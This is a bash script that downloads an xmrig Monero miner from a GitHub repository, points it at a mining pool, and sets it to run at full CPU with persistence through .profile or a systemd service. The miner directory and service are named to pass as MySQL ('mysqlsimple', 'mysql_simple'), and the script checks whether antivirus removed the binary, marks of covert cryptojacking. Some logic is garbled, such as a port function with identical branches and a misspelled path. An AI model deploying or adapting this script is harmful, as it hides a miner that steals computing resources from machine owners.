#!/bin/bash

VERSION=2.11

# printing greetings

echo "Wkgg mining setup script v$VERSION."
echo "(please report issues to  email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_jackteshu_simple.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 13555 ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "13555" -o "$PORT" -gt "13555" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/mysqlsimple/miner.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using mysql_simple systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous mysqlsimple miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop mysql_simple.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/mysqlsimple directory"
rm -rf $HOME/mysqlsimple

echo "[*] Downloading mysqlsimple advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mysqlsimple"
[ -d $HOME/mysqlsimple ] || mkdir $HOME/mysqlsimple
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mysqlsimple; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/mysqlsimple directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/mysqlsimple/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/mysqlsimple/config.json
$HOME/mysqlsimple/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/mysqlsimple/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/mysqlsimple/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/mysqlsimple/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mysqlsimple"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mysqlsimple --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/mysqlsimple directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/mysqlsimple/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/mysqlsimple/config.json
  $HOME/mysqlsimple/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/mysqlsimple/xmrig ]; then
      echo "ERROR: Stock version of $HOME/mysqlsimple/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/mysqlsimple/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/mysqlsimple/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$EMAIL"
fi

sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/mysqlsimple/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/mysqlsimple/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/mysqlsimple/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/mysqlsimple/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/mysqlsimple/xmrig.log'",#' $HOME/mysqlsimple/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/mysqlsimple/config.json

cp $HOME/mysqlsimple/config.json $HOME/mysqlsimple/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/mysqlsimple/config_background.json

# preparing script

echo "[*] Creating $HOME/mysqlsimple/miner.sh script"
cat >$HOME/mysqlsimple/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/mysqlsimple/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/mysqlsimple/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep mysqlsimple/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/mysqlsimple/miner.sh script to $HOME/.profile"
    echo "$HOME/mysqlsimple/miner.sh --config=$HOME/mysqlsimple/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/mysqlsimple/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/mysqlsimple/xmrig.log file)"
  /bin/bash $HOME/mysqlsimple/miner.sh --config=$HOME/mysqlsimple/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/mysqlsimple/xmrig.log file)"
    /bin/bash $HOME/mysqlsimple/miner.sh --config=$HOME/mysqlsimple/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating mysql_simple systemd service"
    cat >/tmp/mysql_simple.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/mysqlsimple/xmrig --config=$HOME/mysqlsimple/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/mysql_simple.service /etc/systemd/system/mysql_simple.service
    echo "[*] Starting mysql_simple systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable mysql_simple.service
    sudo systemctl start mysql_simple.service
    echo "To see miner service logs run \"sudo journalctl -u mysql_simple -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/mysqlsimple/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/mysqlsimple/config_background.json"
fi
echo ""

echo "[*] Setup complete"
echo "[*] Yes-Go"
